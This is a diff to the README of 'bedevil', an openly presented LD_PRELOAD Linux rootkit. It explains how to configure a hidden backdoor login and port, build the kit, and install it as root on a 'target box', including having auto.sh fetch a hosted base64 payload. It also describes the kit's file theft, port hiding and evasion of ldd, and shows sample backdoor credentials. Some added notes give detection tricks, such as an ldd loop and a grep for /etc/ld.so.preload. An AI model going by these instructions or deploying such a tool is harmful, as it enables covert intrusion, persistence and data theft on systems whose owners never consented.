@@ -1,18 +1,14 @@
-# bedevil-nobash
+# bedevil (bdvl)
 
 <img src=https://i.imgur.com/PyO00vy.png alt="icon" />
 
-</br>
-
- * Based on my other rootkit, [vlany](https://github.com/mempodippy/vlany)
- * bedevil is designed to be more robust, faster and efficient than vlany.
+ * Loosely based on my previous rootkit project, [vlany](https://github.com/mempodippy/vlany).
 
 ## Overview
  * This is an LD_PRELOAD rootkit. Therefore, this rootkit runs in userland.
- * This is the same as the [original bdvl](https://github.com/kcaaj/bdvl/tree/master) but however this version eliminates the need for bash.
-   * So naturally this repository is much different from the original.
-   * The original version on the master branch will not continue to be updated.
-   * Therefore updates from this day on will __only__ be in this branch.
+ * This is based on the [original bdvl](https://github.com/kcaaj/bdvl/tree/master), however...
+   * This repository is much different from the original.
+     * Besides new additions, there have been many improvements.
  * During the creation of this rootkit I had some goals in mind.
    * Tidy up previously existing aspects of precursor (LD_PRELOAD) rootkits.
    * Fix outstanding issues. (from vlany)
@@ -20,40 +16,32 @@
    * Working on anything in vlany just felt like a huge mess, I grew to hate this. I knew it could be better...
  * When it comes to actual rootkit dependencies, there are only a few.
    * Most will already be installed.
-   * Those that aren't will be installed before rootkit installation.
+   * Those that aren't either
+     * Will be installed by `etc/auto.sh` before rootkit installation
+     * Or can be installed with `etc/depinstall.sh`
+
 
 <hr>
 
 ## Usage
- * This repository is extremely simple in comparison to the original.
- * Getting an installation up & running is a matter of editing your backdoor settings in `setup.py` & just few brief commands.
-```
- $ make
-rm -rf new_inc
-python setup.py
-Username: changeme
-Password: px0kFNAi
-Hidden port: 26871
-
-        sh etc/ssh.sh changeme <host> 26871 # px0kFNAi
-
-cc -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.x86_64 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.x86_64
-cc -m32 -std=gnu99 -Wall -Inew_inc -g0 -O0 -shared -Wl,-soname,bdvl.so.i686 -fPIC new_inc/bedevil.c -lc -ldl -lcrypt -lpcap -o bdvl.so.i686 2>/dev/null
-make: [Makefile:17: kit] Error 1 (ignored)
-strip bdvl.so*
-```
+ * Getting an installation up & running is pretty easy.
+ * First you'll want to edit maybe a small handful of settings in `setup.py`.
+   * You can fine tune a decent amount of stuff to your liking.
+ * Next, `sh etc/depinstall.sh && make`...
+   * Now in the `build/` directory there are two new files.
+   * `<BD_UNAME>.b64` & `bdvl.so.*`
  * When it comes to the actual installation, you have three choices.
-   * Host the result (_in this case_) `changeme.b64` file somewhere accessible from the target box & point the first variable in `auto.sh` to wherever `changeme.b64` may be.
-   * On the box, when running `auto.sh` supply it a path as an argument to this file wherever it is.
-   * Or with the compiled `bdvl.so.*` you can run (*as root*) `LD_PRELOAD=./bdvl.so.x86_64 sh -c './bdvinstall bdvl.so.*'` & bdvl will, well install. Of course it's vital that dependencies be present beforehand.
-     * This is how `auto.sh` installs bdvl after installing dependencies.
+   * Host the result (_for example_) `build/changeme.b64` file somewhere accessible from the target box & point the first variable in `etc/auto.sh` to wherever `changeme.b64` may be.
+   * On the box, when running `etc/auto.sh` supply it a path as an argument to this file wherever it is.
+   * Or with the compiled `bdvl.so.*` you can run (*as root*) `LD_PRELOAD=./build/bdvl.so.x86_64 sh -c './bdvinstall build/bdvl.so.*'`.
+     * This is how `etc/auto.sh` installs bdvl after installing dependencies.
 
 ### Example usage
  * On my own machine here, I've configured bdvl how I like & have built it.
 
 <img src=https://i.imgur.com/TV9FXSe.png alt=building-bdvl />
 
- * In this example I am using `auto.sh` to grab the result (__changeme.b64__) from a _Python HTTPServer_ I've got running for this purpose.
+ * In this example I am using `etc/auto.sh` to grab the result (__changeme.b64__) from a _Python HTTPServer_ I've got running for this purpose.
  * The last command sent in that screenshot is once the target box is listening for my connection, as seen in the example below.
 
 <img src=https://i.imgur.com/WinYsn2.png alt=installation-process />
@@ -141,7 +129,13 @@ strip bdvl.so*
    * When no rootkit processes are running (_i.e.: not logged into the backdoor_) the rootkit will remove your `.bashrc` & `.profile`, that is until you log back in.
    * I have made everything easily accessible from the backdoor's home directory by plopping symlinks to everything you may need access to.
      * Not unlike `.bashrc` & `.profile` these symlinks are removed from the home directory until you log in.
- * If you aren't root straight away after logging in, just `su root`.
+ * If you aren't root straight away after logging in, `su root`.
+ * __Solution for ([#16](https://github.com/kcaaj/bdvl/issues/16))__:
+```
+su -
+cd
+. .bashrc
+```
 
 <hr>
 
@@ -163,13 +157,15 @@ strip bdvl.so*
    * You can also specify paths & they'll also support wildcards.
  * You may want to consult the default target files & the other settings surrounding it...
  * Files already stolen will be removed at least every `FILE_CLEANSE_TIMER` seconds.
-   * The default value for this is once each day.
+   * The default value for this is once every 8 hours.
    * Change `FILE_CLEANSE_TIMER` to `None` to disable this.
  * By default the rootkit will only steal files with a max size of `MAX_FILE_SIZE` bytes.
-   * __The default limit for this value is 20mb.__
+   * __The default value for this limit is 20mb.__
    * Set this value to `None` & the rootkit will steal target files regardless of size.
    * Memory for the contents of target files is allocated in chunks.
      * In setup.py there is `MAX_BLOCK_SIZE` & `BLOCKS_COUNT`... See the comments surrounding these values for more.
+ * `MAX_STEAL_SIZE` in `setup.py` determines how much stolen stuff can be stored at one time.
+   * __The default value for this limit is 800mb.__
  * Target files are stolen in the user's process so we aren't weirdly modifying file access times by doing this.
  * A file referenced by something such as `rm` by a user will be stolen before being removed.
    * `rm` is just a random example. This same logic applies for anything.
@@ -192,7 +188,6 @@ strip bdvl.so*
 
 ##### Port hiding
  * With bedevil installed, you can hide or unhide any ports/ranges on the box by editing the `hide_ports` file in the rootkit's installation directory.
- * Additionally, before any configuration/setup, you can define what ports/ranges will be hidden by writing them to `inc/hide_ports`.
 ```
 $ cat hide_ports
 9146
@@ -217,17 +212,24 @@ $ cat hide_ports
    * This is because, during the runtime of (_in this case_) `ldd` the rootkit is not installed.
    * Upon the application exiting/returning, the parent (rootkit) process of whatever just finished running reinstalls the rootkit.
 
+<hr>
 
-<!--
+# Other notes
+ * While bdvl's __DO_EVASIONS__ functionality (*see [Scary things](#scary-things)*) is effective, it also presents a fairly big weakness.
+   * `while true; do ldd /bin/ls >/dev/null; done`
+   * This very small while loop will temporarily remove the rootkit... Until the loop is killed.
+   * Leaving an open window to do some digging around in a new clean shell.
+     * Rootkit files & processes will not be hidden...
+     * Hidden ports will no longer be hidden... 
+     * The rootkit will be visibly loaded in other (infected) process' memory map files...
+   * Mitigating something like this could be tough...
 
-RANDOM NOTES:
-  having DO_EVASIONS enabled allows a 'bug' where a root user can
-  uninstall the rootkit by running ldd through an infinite
-  loop. i.e.: `while true; do ldd /bin/echo; done`
+ * Behaviour exhibited by __PATCH_DYNAMIC_LINKER__ can be observed by a regular user.
+   * https://twitter.com/ForensicITGuy/status/1170149837490262016
+     * `find /lib*/ -name 'ld-2*.so' -exec grep '/etc/ld.so.preload' {} \;`
+   * Additionally if `/etc/ld.so.preload` seems to do nothing when written to, you know your box is infected.
 
-LINKS OF INTEREST:
- - https://pastebin.com/rZvjDzFK
-
-asddsadsad
-
--->
+ * A magic ID is a bruteforcable value.
+   * https://pastebin.com/rZvjDzFK
+     * Depending on the system something like this could take a long time until the target ID is reached.
+   * bdvl somewhat lessens the threat of something like this with the implementation of the automatic GID changer.
